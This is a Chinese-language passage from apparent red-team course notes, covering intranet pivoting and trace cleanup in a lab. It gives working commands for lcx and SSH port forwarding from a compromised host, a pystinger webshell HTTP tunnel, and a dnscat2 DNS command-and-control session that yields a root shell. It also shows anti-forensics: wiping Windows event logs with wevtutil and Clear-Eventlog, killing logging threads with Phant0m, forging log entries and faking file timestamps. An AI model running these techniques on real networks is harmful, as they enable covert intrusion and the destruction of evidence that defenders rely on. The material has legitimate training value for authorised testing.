Lcx程序多用于被控制计算机处于内网的时候，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登录到本机进行管理方便，因此在很多情况下，都会想方设法在被控制计算机上开启3389端口，然后通过lcx等进行端口转发，进而在本地连接到被控制计算机的远程终端并进行管理和使用。在没有端口转发的情况下外网主机是不能直接连接内网主机的，但是lcx工具可以将内网主机（出入内网主机的需要能够ping通互联网）的某个端口抓发到外网的某个端口上面，这样的话处于外网的主机可以将映射到外网的端口再反弹到另一个外网的端口上面（用的最多的是3389），这样我们就可以直接远程连接反弹的端口就可以与内网主机进行通信。故内网已经打通，说实话lcx的工具如同在路由器上面做了端口转发。

人话：将肉鸡的某个端口（3389）的流量转发到跳板机的某个内网端口（5555），跳板机的内网端口端口（5555）再转发到外网端口端口（6666），kali再监听外网端口（6666）的流量

### 2.3 复现

**肉鸡运行**

将本机的3389端口的流量转发到 192.168.231.153 9000端口

```bash
C:\Users\xiaofei\Downloads>lcx.exe -slave 192.168.231.153 9000 127.0.0.1 3389
```

**Kali运行**

监听本机的900端口的流量并转发到5555端口

```bash
┌──(root㉿kali)-[/home/kali/tunnel/LCX/LCX]
└─# ./linux_lcx -listen 9000 5555
```

使用`rdesktop`工具接收流量

```bash
──(root㉿kali)-[/home/…/tunnel/LCX/win_LCK/LCX]
└─# rdesktop 127.0.0.1:5555
```

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231112225745000.png" alt="image-20231112225745000" style="zoom:50%;" />

Rdesktop是一个在Linux下支持Windows远程桌面连接的客户端程序，可以让我们在Linux系统上远程访问Windows桌面工具介绍它实现了RDP协议，支持多种版本

以下是一些常用的rdesktop命令参数

- `-g` 后接想要显示的分辨率，使用 `-g workarea` 可自适应铺满当前linux窗口大小
- `-P` 启用位图缓存
- `-z` 启用RDP数据流压缩
- `-x l` 使用局域网级别的图像质量
- `-r sound:off` 关闭声音
- `-u windowuser` 指定要使用的用户

例如，你可以使用类似下面的命令来访问远程Windows系统

```
rdesktop -g 1440x900 -P -z -x l -r sound:off -u windowsuser 192.168.31.100:3389
```

## 3. 应用层隧道

### 3.1 SSH本地端口转发

#### 3.1.1 SSH本地端口转发原理

本地主机无法连接到内网，但是又取得了Web服务器（跳板）的账号密码，就可以在本地主机建立向内网主机SSH连接，由Web服务器（跳板）做转发

前提：取得跳板机的账号密码

#### 3.1.2 SSH本地端口转发语法

```
-C：请求压缩所有数据；
-f：后台执行ssh指令；
-g：允许远程主机连接本地主机的转发端口；
-N：静默模式；
-L：本地端口转发
-R：远程端口转发
-D：动态转发

ssh -fCNg -L local-port:target-host:target-port username@tunnel-host
ssh -fCNg -L 本地端口:目标IP地址:目标端口 隧道用户名@隧道IP地址
```

#### 3.1.3 SSH本地端口转发示例

**SSH 服务器配置**

删除以下配置注释符

```bash
Port 22
PermitRootLogin yes
PasswordAuthentication yes
```

**本地发起SSH连接**

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -fCNg -L 10010:192.168.231.103:3389 root@192.168.231.152
```

**本地 rdesktop 工具监听流量**

```bash
┌──(kali㉿kali)-[~]
└─$ rdesktop 127.0.0.1:10010 
```

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231113092539745.png" alt="image-20231113092539745" style="zoom:67%;" />

### 3.2 SSH远程端口转发

#### 3.2.1 SSH 远程端口转发原理

本地计算机无法访问内网，但又拿到了Web服务器的控制权限，就可以拿Web服务器做跳板，通过Web服务器的SSH来连接内网的主机，再将流量转发到本地

前期：取得跳板机的高级shell权限

#### 3.2.2 SSH 远程端口转发语法

```
-C：请求压缩所有数据；
-f：后台执行ssh指令；
-g：允许远程主机连接本地主机的转发端口；
-N：静默模式；
-L：本地端口转发
-R：远程端口转发
-D：动态转发

ssh -fCNg -R local-port:target-host:target-port local-username@local-host
ssh -fCNg -R 本地端口:目标IP地址:目标端口 本地用户名@本地IP地址
```

#### SSH 远程端口转发示例

**开启SSH服务**

本地和跳板机都要开启SSH服务

```
Port 22
PermitRootLogin yes
PasswordAuthentication yes
```

**跳板机发起SSH连接**

```bash
root@ubuntusrv1604:/home/lonelyor# ssh -fCNg -R 10030:192.168.231.103:3389 kali@192.168.231.153
```

**本地 rdesktop 监听流量**

```bash
┌──(kali㉿kali)-[~]
└─$ netstat -antlp|grep 10030  
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:10030         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:10030               :::*                    LISTEN      -   
```

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231113092539745.png" alt="image-20231113092539745" style="zoom:67%;" />

### 3.3 总结

本地端口转发：由**本地发起SSH连接**到内网，跳板机只负责流量转发

远程端口转发：由**跳板服务器发起SSH连接**请求，之后再将SSH的流量转发到本地

端口转发不一定只转发3389流量，也可以转发web服务等，也可通过下面这种方式以访问`192.168.231.153:80`来达到访问`192.168.231.103:80`的效果

```
root@ubuntusrv1604:/home/lonelyor# ssh -fCNg -R 10030:192.168.231.103:80 kali@192.168.231.153
```

## 4. HTTP隧道

### 4.1 HTTP隧道原理

通过HTTP协议与代理服务器建立连接，把所有要传送的数据全部封装到HTTP协议里进行传送，协议中包含有要连接的远程主机的IP和端口，连接成功之后会返回给客户端200，表示验证通过。

这个方法非常的有意思，有点像VPN加速器，也可以达到翻墙的效果！甚至可以让指定的计算机发送HTTP流量

### 4.2 HTTP隧道复现

#### 4.2.1 工具下载

```
毒刺工具下载地址：https://github.com/FunnyWolf/pystinger/releases/download/v1.6/pystinger.zip
```

Client为本地主机，Server为转发服务器；附带编译好了的Linux和Windows程序

![image-20231113214701455](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231113214701455.png)

#### 4.2.2 服务端操作

服务端本地需要有web站点，将相应的webshell和应用程序拷贝到服务端

![image-20231113215010735](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231113215010735.png)

服务端运行应用程序

![image-20231113215042596](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231113215042596.png)

#### 4.2.3 客户端操作

客户端运行应用程序，如果运行失败记得添加执行权限！

```bash
┌──(root㉿kali)-[/home/kali/tunnel/http/dist]
└─# ./stinger_client -w http://192.168.231.103/proxy.php -l 0.0.0.0 -p 10000 

    ./stinger_client -w http://服务器IP地址/proxy.php -l 客户端监听地址 -p 客户端监听端口
```

客户端使用`SwitchyOmega`插件或者其他方式指定代理地址，后续访问web服务都将通过这个代理转发

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231113215402927.png" alt="image-20231113215402927" style="zoom:50%;" />

## 5. DNS隧道

### 5.1 DNS隧道原理

STEP 1：受害主机向本地DNS服务器发送一个查询[http://hacker.com](https://link.zhihu.com/?target=http%3A//hacker.com)的请求（这个域名属于黑客）

STEP 2：本地DNS服务器无法返回查询结果，就通过防火墙向根DNS服务器发出查询请求

STEP 3：经过大量的迭代查询后，DNS请求到达[http://hacker.com](https://link.zhihu.com/?target=http%3A//hacker.com)的DNS服务器，该服务器处于黑客的控制之下

STEP 4：黑客将请求查询的响应结果（包含恶意代码）迭代返回，通过防火墙返回到本地服务器

STEP 5：本地服务器最终将响应结果返回给受害主机

STEP 6：受害主机收到响应结果，并根据恶意代码指令执行操作

由于DNS服务是一个不可或缺的服务，所以非常容易绕过防火墙和WAF。安全检测工具对这类的检测也比较少

### 5.2 DNS隧道工作模式

#### IP直连型

直连也就是客户端直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度更快，但是隐蔽性较差，容易被WAF或者IDS设备探测到，另外限制比较高，很多实际场景下不允许攻击者来自定义DNS Server，否则很容易被发现。

DNS协议的下层协议为UDP传输协议，这种隧道客户端通常使用UDP socket建立连接，实际上是基于UDP的，但是要利用到53端口。

![图片](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/2156235-20211115093309004-275608401.png)

#### 域名中继型

通过DNS递归查询实现的中继隧道，比较隐蔽，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多(其实就类似伪造一台私有DNS Server，当然也许大佬神仙们真有一台权威DNS Server也说不一定哈)，同时我们还需要规避本地客户端的DNS缓存，这里可以使用随机域名生成算法（DGA）。很多恶意软件利用该算法生成随机域名，有效绕过黑名单检测，通过轮询的方式尝试连接，寻找C2控制中心。（DGA算法的检测测方法也有不少，这里按下不表）

![图片](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/2156235-20211115093309264-449698956.png)

### 5.3 DNS隧道复现

```
dnscat2下载地址：https://github.com/iagox86/dnscat2
```

#### 5.3.1 肉鸡编译

进入client文件夹`make`命令编译

```bash
root@00192eb650f2:/dnscat2/client# make
```

#### 5.3.2 Kali编译和运行

进入server文件夹执行下面命令

```bash
┌──(kali㉿kali)-[~/tunnel/dns/dnscat2/server]
└─$ sudo apt install ruby-dev -y  

# ruby 更换国内源
# 查看源
gem sources l

# 删除官方源
gem sources --remove https://rubygems.org/

# 添加阿里巴巴gem镜像
gem sources -a https://mirrors.aliyun.com/rubygems/

# 查看结果是否正确
C:\Users\Administrator>gem sources -a https://mirrors.aliyun.com/rubygems/
https://mirrors.aliyun.com/rubygems/ added to sources

# 重启计算机
┌──(kali㉿kali)-[~/tunnel/dns/dnscat2/server]
└─$ sudo gem install bundler

# 不行再换root权限
┌──(kali㉿kali)-[~/tunnel/dns/dnscat2/server]
└─$ bundle install

# 启动程序
┌──(root㉿kali)-[/home/…/tunnel/dns/dnscat2/server]
└─# ruby dnscat2.rb   

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=06807264d6c023c2002c496fb48766b0

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

**报错**

如果遇到下面报错，则说明缺少了某个依赖包，使用`gem install sha3`安装即可

```bash
┌──(root㉿kali)-[/home/…/tunnel/dns/dnscat2/server]
└─# ruby dnscat2.rb    

New window created: 0
dnscat2> <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require': cannot load such file -- sha3 (LoadError) # 缺少的依赖程序
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
        from /home/kali/tunnel/dns/dnscat2/server/controller/encryptor.rb:13:in `<top (required)>'
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
        from /home/kali/tunnel/dns/dnscat2/server/controller/session.rb:10:in `<top (required)>'
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
        from /home/kali/tunnel/dns/dnscat2/server/controller/controller.rb:13:in `<top (required)>'
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
        from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require'
        from dnscat2.rb:20:in `<main>'
```

#### 5.3.3 客户端运行

```bash
# 运行参数由服务器运行的时候自动给出
root@00192eb650f2:/dnscat2/client# ./dnscat --dns server=192.168.231.153,port=53 --secret=06807264d6c023c2002c496fb48766b0
Creating DNS driver:
 domain = (null)
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 192.168.231.153

** Peer verified with pre-shared secret!

Session established!
```

#### 5.3.4 dnscat2 的使用

```bash
# 查看所有会话
dnscat2> windows
0 :: main [active]
  crypto-debug :: Debug window for crypto stuff [*]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains =  [*]
  1 :: command (00192eb650f2) [encrypted and verified] [*]
  
# 进入指定会话
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

# 查看帮助
command (00192eb650f2) 1> help

Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows

# 拿shell，返回了会话2
command (00192eb650f2) 1> New window created: 2
Shell session created!

# 将会话调至后台运行，相当于materpreter的background
command (00192eb650f2) 1> suspend

# 进入会话2 
nscat2> window -i 2
New window created: 2
history_size (session) => 1000
Session 2 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

# 成功拿到root权限
sh (00192eb650f2) 2> whoami
sh (00192eb650f2) 2> root

```

## 6. ProxyChains 代理

如果在kali上面装clash的话，就要修改系统配置文件。在不用代理的时候呢，又要改回去，这样非常的麻烦，偶然发现了这种方法。proxychains工具kali自带

**6.1 保证Clash正确配置且能上网，并打开 Allow VLAN**

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231115120252259.png" alt="image-20231115120252259" style="zoom:67%;" />

**6.2 修改ProxyChains配置文件**

```bash
#        Examples:
#				协议     IP地址          端口号   用户名   密码
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
http 192.168.231.1 7890
```

**6.3 测试结果**

```bash
┌──(root㉿kali)-[/home/kali]
└─# proxychains curl cip.cc    
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  192.168.231.1:7890  ...  cip.cc:80  ...  OK
IP      : 210.129.58.64
地址    : 日本  福岛县  白河市
运营商  : idcf.jp

数据二  : 日本 | IDCF云计算数据中心

数据三  : 日本福岛县

URL     : http://www.cip.cc/210.129.58.64
```

# 第八章：痕迹清理

## 1. 痕迹清理概述

**痕迹清理技术要点说明**

痕迹清理，是清理自己在目标机器上留下的所有操作痕迹。其主要目的是

- 避免溯源
- 隐藏攻击方法
- 为下一步渗透拖延时间

每一项渗透动作都有其目的，我们都需要思考其是否真正的有必要，并不是每一次渗透均需要进行痕迹清理的动作。

**痕迹清理的限制**

- 痕迹清理这个动作本身也会产生痕迹，所以不存在完美的痕迹清理
- 如果目标已经配置，第三方的日志记录平台，本机的痕迹清理作用微乎其微，除非我们可以拿下日记系统的控制权限。

**痕迹清理的技术要点**

- 痕迹清理前需要先判断是否有必要清理痕迹。
- 删除文件尽量使用复写方式，增加还原难度。
- 如有必要可以伪造部分痕迹，混淆防守队溯源反向。
- 定向删除优于全部删除，关闭日志等方式，增加被识别难度。
- 如果痕迹清理的目的是为了下一步操作争取时间，那么我们需要去评估防守队的溯源时间，以安排后面的工作计划，当然极端情况我们可以在防守方休息时间段开展渗透。

**痕迹清理的步骤**

[![红队笔记之痕迹清理技术要点与实战方法总结](%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/41658898685-17000231027347.png)](https://www.moonsec.com/wp-content/uploads/2022/07/41658898685.png)

1、清理的必要性主要区间与你的目的。

2、需要清理哪些内容需要根据你的攻击路径来判断，也就是说你整个攻击路径中哪些会留下痕迹，我们需要清楚，我们的清理工作也真实针对这些痕迹进行操作。

3、痕迹清理相对主要简单，在你明确了需要清理哪些痕迹后，只要寻找对应的清理方法即可，下文总结常用的痕迹清理方法。

## 2. Windows日志机制与日志清理

### 2.1 Windows 日志机制

+ Windows 日志包含9个元素：日期/时间、事件、类型、用户、计算机、事件ID、来源、类别、描述、数据
+ `svhost.exe`中某些专门用于记录日志的线程启动日志记录功能
+ 记录的操作回先缓存为一段内存内容
+ 将内存内容通过`wevtuil.exe`解析为xml文件格式的文档
+ 将xml文件转换为可读的日志
+ 日志注册表的键：`HKEY_LOCAL_MACHINE\system\CurrentControlSet\Services\Eventlog`通过修改注册表中不同程序调用的日志记录程序或者链接库的路径，可以确保使用该程序时不会生成相关日志

### 2.2 Windows 日志机制与日志清理

```bash
# 删除所有系统日志
C:\Windows\system32>wevtutil cl system

# 删除所有应用日志
C:\Windows\system32>wevtutil cl application

# 删除所有安全日志
C:\Windows\system32>wevtutil cl security

# 列出系统中所有的日志名称
C:\Windows\system32>wevtutil el

# 获取系统日志信息
C:\Windows\system32>wevtutil gli system			
creationTime: 2022-03-22T08:19:24.837Z			# 日志创建时间
lastAccessTime: 2022-03-22T08:19:24.837Z		# 最后访问时间
lastWriteTime: 2023-11-15T07:55:36.263Z			# 最后写入时间
fileSize: 3215360				# 文件大小
attributes: 32					# 日志文件的属性
numberOfLogRecords: 4766		# 日志记录数量
oldestRecordNumber: 1			# 最早的日志记录编号	

# 查看指定类别的日志类容；输出格式为文本
C:\Windows\system32>wevtutil qe /f:text system

# 用于清除事件日志。-Log选项后面跟着的是要清除的日志名称，这里是应用程序日志（Application）、系统日志（System）和安全日志（Security）。
PS C:\Windows\system32> powershell -Command "&{Clear-Eventlog -Log Application,System,Security}"
```

## 3. Windows 停止日志记录线程

> 项目地址：https://github.com/hlldz/Phant0m

**3.1 获取当前powershell的执行策略**

+ Restricted（受限制）： 默认的执行策略。在此策略下，不允许运行任何脚本。只能运行命令。
+ AllSigned（全部已签名）：*只有经过数字签名的脚本才能运行。
+ RemoteSigned（远程已签名）：允许在本地计算机上编写并运行脚本，但是从网络下载的脚本必须经过数字签名。
+ Unrestricted（无限制）：允许在本地计算机和从网络下载的任何脚本运行，没有签名要求。
+ Bypass（绕过）：在此策略下，所有脚本都可以运行，而无需签名。

```powershell
PS C:\Windows\system32> Get-ExecutionPolicy
Unrestricted
```

**3.2 更改执行策略**

```powershell
PS C:\Windows\system32> Set-ExecutionPolicy Unrestricted

执行策略更改
执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170
中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?
[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y
```

**3.3 停止日志记录线程**

```powershell
# 绕过执行策略，可以执行任何脚本，包括未签名的脚本。
PS C:\Users\lonelyor\Downloads\Phant0m-master\old> powershell -exec bypass
Windows PowerShell
版权所有 (C) Microsoft Corporation。保留所有权利。

# 导入模块 Invoke-Phant0m.ps1
PS C:\Users\lonelyor\Downloads\Phant0m-master\old> Import-Module .\Invoke-Phant0m.ps1

# 启动脚本；此时回关闭Windows的日志记录线程，后续的操作将不会再记录到Windows日志中
PS C:\Users\lonelyor\Downloads\Phant0m-master\old> Invoke-Phant0m
```

**3.4 恢复日志服务**

在任务管理器中，找到`EventLog`，单击转到详细信息

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231115200646567.png" alt="image-20231115200646567" style="zoom:67%;" />

点击结束进程

<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95v2-%E5%85%A8%E6%A0%88%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6%E7%8F%AD.assets/image-20231115200803787.png" alt="image-20231115200803787" style="zoom:67%;" />

dos命令再次启动日志记录服务

```bash
C:\Windows\system32>net start eventlog
Windows Event Log 服务正在启动 .
Windows Event Log 服务已经启动成功。
```

## 4. 伪造日志与伪造文件修改时间

### 4.1 伪造日志

创建一个警告的日志事件，源为admin，内容为：this is a test

```powershell
PS C:\Windows\system32> eventcreate -l system -so admin -t warning -d "this is a test" -id 500

成功: 'warning' 类型的事件被创建在 'system' 日志里，用 'admin' 作为源。
```

### 4.2 伪造文件修改时间

```bash
# 修改文件创建时间
(Get-Item 'test.txt').CreationTime = "2023-11-16 00:00:00"
# 修改文件最后写入时间
(Get-Item 'test.txt').LastWriteTime="2023-11-16 00:00:00"
# 修改wen'ji
(Get-Item 'test.txt').LastAccessTime="2023-11-16 00:00:00"
```

